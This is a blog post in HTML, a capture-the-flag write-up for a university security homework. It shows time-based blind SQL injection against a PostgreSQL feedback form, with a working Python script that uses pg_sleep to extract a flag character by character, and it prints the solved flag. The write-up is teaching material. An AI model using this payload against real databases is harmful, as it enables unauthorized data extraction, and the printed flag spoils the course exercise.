@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Yugeng Liu">
+
+
+
+
+
+<title>SQLi | 叫我胖更好了</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><img src="/image/yinzhang.png" width="30"/></a> </div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/publications">Publications</a>
+                
+                    <a class="menu-item" href="/misc">Misc.</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">叫我胖更好了</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/publications">Publications</a>
+                
+                    <a class="menu-item" href="/misc">Misc.</a>
+                
+            </div>
+        </div>
+    </nav>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130596599-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-130596599-2');
+    </script>
+
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQLi</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Yugeng Liu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 18, 2020&nbsp;&nbsp;1:56:14</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>This is a CTF problem on SQL injection. I think it is not very hard but not easy to find the idea. Here is the <a target="_blank" rel="noopener" href="https://web19.scy-phy.net/sec/feedback.html">website</a>. This is the homework of the Security Lecture at Saarland University. Other pages are other homework but easy to solve. If you are interested in them, send me emails to get more information.</p>
+<h3 id="analysis">Analysis</h3>
+
+<p>The first thing is to find the injection method. Now that there is a query function, there must be somewhere to inject. After scanning the source code of this web, I find this is an ajax code to send a post request to the server.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submit_feedback</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> entry = $(<span class="string">&#x27;#feedback&#x27;</span>).val();</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        url: <span class="string">&quot;/users/feedback&quot;</span>,</span><br><span class="line">        data: &#123; <span class="attr">feedback</span>: entry, <span class="attr">usr</span>: <span class="number">1</span> &#125;,</span><br><span class="line">        dataType: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;feedback&#x27;</span>).value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;res&quot;</span>).innerHTML = <span class="string">&#x27;&lt;h3 style=&quot;color:green;&quot;&gt;Thank you for your feedback!&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;res&quot;</span>).innerHTML = <span class="string">&#x27;&lt;h3 style=&quot;color:green;&quot;&gt;Thank you for your feedback!&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In the source code, <font color=indianred>entry</font> is used to get the input from the user typing and then ajax sends a post containing the value of <font color=indianred>entry</font> to a certain URL. </p>
+<p>When sending the feedback to the server, the return value here is quite simple, just contain an id number of your feedback.</p>
+<h3 id="experiment">Experiment</h3>
+
+<p>First and foremost, if we want to make some SQL injection, the correct syntax used to close the query is the most important thing. There is no check on what we input so that we can type the common injection method. An apostrophe is used to close the <font color=indianred>feedback</font> value. After that, I use the &#39;*DEFAULT) RETURNING <em>;</em> &#39; to camouflage the rest required parameter (usr: 1) and return value (id).</p>
+<p>Next, we can inject some SQL query function. I tried to use &#39;<em>SELECT</em>&#39; function to achieve something but because of the return value in the server, we cannot get other information from it. So, we need to find some other ideas to allow the server to return some useful things. The method I used here is the &#39;<em>pg_sleep()</em> &#39; function. It won&#39;t return any value but stop some seconds to return the original value. So, we can guess the flag based on this.</p>
+<p>Last but not least, how to find the right flag is a problem. As we know SQL syntax cannot use a common way like other programming languages. Getting each index of the flag string is where I wasted time. Finally, I use &#39;<em>CASE</em> &#39; in SQL to activate the &#39;<em>pg_sleep()</em> &#39; function and use &#39;<em>LEFT</em> &#39; to achieve the first substrings to make the decision in &#39;<em>CASE</em> &#39; function.</p>
+<h3 id="code">Code</h3>
+
+<p>Because I don&#39;t the length of the flag string, I use python to make a loop to get each bit of the string by myself and the last bit must be &#39;&#39;}&#39;&#39;. Here is the python code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://web19.scy-phy.net/users/feedback&#x27;</span></span><br><span class="line">a = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>)]</span><br><span class="line"><span class="comment"># create a dictionary including all the ASCII characters we need</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    entry = <span class="string">&quot;1&#x27;,DEFAULT) RETURNING *; SELECT feedback, (CASE WHEN (LEFT(feedback, 6) = &#x27;FLAG&#123;&quot;</span> + i + <span class="string">&quot;&#x27;) THEN pg_sleep(3) END) FROM feedbacks WHERE id = &#x27;1&#x27;; --)&quot;</span></span><br><span class="line">    print(i)</span><br><span class="line">    myobj = &#123;</span><br><span class="line">        <span class="string">&#x27;feedback&#x27;</span>: entry,</span><br><span class="line">        <span class="string">&#x27;usr&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    x = requests.post(url, data = myobj)</span><br><span class="line">    print(x.text)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+<p>So, when it is correct, there will be a 3 seconds gap. We can record the value of i. Finally, we can get the flag: FLAG{F33db4ck_I_br0ke_your_webs1te!}</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Yugeng Liu</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://liu.ai/2020/01/18/SQLi/">https://liu.ai/2020/01/18/SQLi/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright &copy; <script> var date, year; date = new Date(); year = date.getFullYear(); document.write(year); </script> <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"><i class="iconfont icon-tags"></i> CTF</a>
+                    
+                        <a href="/tags/SQL-injection/"><i class="iconfont icon-tags"></i> SQL injection</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/04/Paper%20Reading%20Essay%203/">Paper Reading Essay 3</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/19/Paper%20Reading%20Essay%202/">Paper Reading Essay 2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>Copyright &copy; 
+        <script>
+	        var date, year;
+	        date = new Date();
+	        year = date.getFullYear();
+	        document.write(year);
+	    </script>
+        Yugeng Liu | theme by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+
+
+        <!--script type="text/javascript" color="220,220,220" opacity='0.8' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script-->
+    </div>
+</body>
+</html>
